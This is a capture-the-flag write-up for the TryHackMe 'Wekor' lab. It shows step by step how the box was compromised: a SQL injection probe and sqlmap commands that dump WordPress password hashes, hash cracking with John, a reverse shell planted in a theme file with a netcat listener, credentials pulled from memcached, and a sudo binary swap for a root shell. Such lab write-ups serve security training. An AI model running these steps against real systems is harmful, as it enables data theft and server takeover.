# Write-Up — [Wekor](https://tryhackme.com/room/wekorra) (TryHackMe)

## Overview
The Wekor room challenges you to complete a full penetration testing chain: from initial recon and site discovery to SQL injection, WordPress exploitation, memcached abuse, and privilege escalation to root. This room is a great opportunity to strengthen your recon, web exploitation, and Linux privilege escalation skills.

## Initial Scanning
```python
nmap -sC -sV -T4 10.10.132.94
```

Open Ports:

* 80/tcp — HTTP

* 22/tcp — SSH

## Web Recon

```python
gobuster dir -u http://10.10.132.94 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt
```
Found robots.txt with interesting disallowed directories:

```python
/workshop/
/root/
/lol/
/agent/
/feed
/crawler
/boot
/comingreallysoon
/interesting
```
In ```/comingreallysoon``` we find a message:

> “We’ve setup our latest website on /it-next…”

## Exploring /it-next
The ```/it-next``` site is an IT shopping platform.

Visiting ```/it-next/it_cart.php```, we find a coupon input field.

Trying ```' OR 1=1#``` triggers an SQL error — likely SQL injection.

## Exploiting the SQL Injection
Capture the request with Burp Suite

Right-click → Save Item

Use sqlmap:
```python
sqlmap -r request.txt --dbs
```
Found databases — we're interested in wordpress:
```python
sqlmap -r request.txt -D wordpress --tables
sqlmap -r request.txt -D wordpress -T wp_users --dump
```
## Extracting WordPress Credentials
In ```wp_users```, we retrieve WordPress usernames and hashed passwords.

Add this to ```/etc/hosts```:

```python
10.10.132.94 site.wekor.thm wekor.thm
```
Save the hashes and crack them with John:
```pythom
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
We recover 2 passwords. One of them belongs to ```wp_yura```, an admin.

## WordPress RCE via Theme Editor

Login at:
```http://site.wekor.thm/wordpress/wp-admin```

Go to Appearance → Theme Editor → 404.php

Insert a reverse shell

Start listener:
```python
nc -lvnp 4444
```
Open:
```http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php```

## Investigating the System – memcached
We discover the ```memcached``` service running on port ```11211```.
```python
telnet localhost 11211
get username
get password
```
Retrieve credentials for user ```Orka```

## Switching to Orka

Stabilize the shell:
```python
export TERM=xterm
python -c 'import pty; pty.spawn("/bin/sh")'
```
Switch to user:
```python
su Orka
```
Read ```user.txt```

## Privilege Escalation

Check for sudo permissions:
```python
sudo -l
(ALL) /home/Orka/Desktop/bitcoin
```
Exploit by replacing the binary:
```python
mv Desktop olddesktop
mkdir Desktop
cp /bin/bash ./Desktop/bitcoin
sudo ./Desktop/bitcoin
```
You get a root shell.
```python
cat /root/root.txt
```
## Conclusion

Wekor is an excellent example of a real-world-style attack chain, covering recon, SQL injection, WordPress exploitation, service abuse, and privilege escalation. A perfect training ground for anyone practicing OSCP-style techniques.


